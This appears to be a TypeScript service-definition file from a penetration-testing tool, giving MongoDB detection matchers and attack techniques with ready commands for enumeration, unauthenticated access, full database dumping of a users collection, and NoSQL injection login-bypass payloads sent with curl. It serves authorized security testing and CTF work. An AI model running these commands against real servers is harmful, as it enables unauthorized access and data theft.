/**
 * MongoDB Service Configuration
 * MongoDB NoSQL Database
 * 
 * @version 1.0.0
 * @author Security Team
 */
import type { ServiceConfig } from '../types';

export const mongodbConfig: ServiceConfig = {
  id: 'mongodb',
  name: 'MongoDB',
  description: 'MongoDB - популярная документо-ориентированная NoSQL база данных. Часто развертывается без аутентификации, что приводит к утечкам данных. Использует BSON-формат и JavaScript-подобный язык запросов.',
  categoryId: 'database',
  version: '1.0.0',
  tags: ['database', 'nosql', 'mongodb', 'json', 'document-store'],

  matchers: {
    serviceNames: ['mongodb', 'mongo'],
    cpePatterns: ['cpe:/a:mongodb:mongodb'],
    bannerRegex: [
      'MongoDB',
      'mongo',
      '\\x3a\\x00\\x00\\x00',  // MongoDB header
    ],
    productPatterns: ['MongoDB', 'mongo'],
    standardPorts: [27017, 27018, 27019],
    nseScriptMatchers: [
      { scriptName: 'mongodb-info', outputPattern: '.' },
    ],
  },

  confidenceThreshold: 35,

  techniques: [
    {
      id: 'mongodb-enum',
      name: 'MongoDB Enumeration',
      mitreId: 'T1046',
      description: 'Сбор информации о MongoDB сервере без аутентификации.',
      commands: [
        { tool: 'nmap', command: 'nmap -p 27017 --script mongodb-info,mongodb-databases <target>', description: 'MongoDB enumeration' },
        { tool: 'mongo', command: 'mongo --host <target> --port 27017', description: 'Connect to MongoDB' },
        { tool: 'mongo', command: 'mongo mongodb://<target>:27017', description: 'Connection string' },
      ],
      nseScripts: [
        { name: 'mongodb-info', description: 'Информация о MongoDB', safe: true },
        { name: 'mongodb-databases', description: 'Список баз данных', safe: true },
      ],
      difficulty: 'easy',
      tags: ['enumeration', 'reconnaissance'],
    },
    {
      id: 'mongodb-unauth',
      name: 'Unauthenticated Access',
      mitreId: 'T1078',
      description: 'Подключение к MongoDB без аутентификации. Очень распространено.',
      commands: [
        { tool: 'mongo', command: 'mongo --host <target> --eval "db.version()"', description: 'Test unauth access' },
        { tool: 'mongo', command: 'mongo --host <target> --eval "db.adminCommand({listDatabases:1})"', description: 'List databases' },
        { tool: 'nmap', command: 'nmap -p 27017 --script mongodb-brute <target>', description: 'Check auth required' },
      ],
      difficulty: 'easy',
      tags: ['misconfiguration', 'unauthenticated'],
    },
    {
      id: 'mongodb-dump',
      name: 'Database Dumping',
      mitreId: 'T1005',
      description: 'Извлечение всех данных из MongoDB.',
      commands: [
        { tool: 'mongodump', command: 'mongodump --host <target> --port 27017 --out ./dump', description: 'Full database dump' },
        { tool: 'mongo', command: 'mongo --host <target> --eval "db.getCollectionNames()" database', description: 'List collections' },
        { tool: 'mongo', command: 'mongoexport --host <target> --db database --collection users --out users.json', description: 'Export collection' },
      ],
      difficulty: 'easy',
      tags: ['data-exfiltration', 'dumping'],
    },
    {
      id: 'mongodb-nosql-injection',
      name: 'NoSQL Injection',
      mitreId: 'T1059',
      description: 'Эксплуатация NoSQL-инъекций в веб-приложениях с MongoDB.',
      commands: [
        { tool: 'curl', command: 'curl -X POST -H "Content-Type: application/json" -d \'{"username":{"$ne":""},"password":{"$ne":""}}\' http://target/login', description: 'Basic NoSQL injection' },
        { tool: 'curl', command: 'curl -X POST -H "Content-Type: application/json" -d \'{"username":"admin","password":{"$regex":"^flag.*"}}\' http://target/login', description: 'Regex-based injection' },
      ],
      difficulty: 'medium',
      tags: ['injection', 'nosql', 'web'],
    },
  ],

  triggers: [],

  ui: {
    icon: 'database',
    color: '#22c55e',
    displayPriority: 85,
  },

  references: [
    { title: 'MongoDB Pentesting', url: 'https://book.hacktricks.xyz/network-services-pentesting/27017-27018-mongodb' },
    { title: 'NoSQL Injection', url: 'https://book.hacktricks.xyz/pentesting-web/nosql-injection' },
  ],

  notes: 'MongoDB часто развертывается БЕЗ аутентификации. Это классическая находка в CTF и реальных аудитов. Проверяйте порты 27017-27019.',
};

export default mongodbConfig;
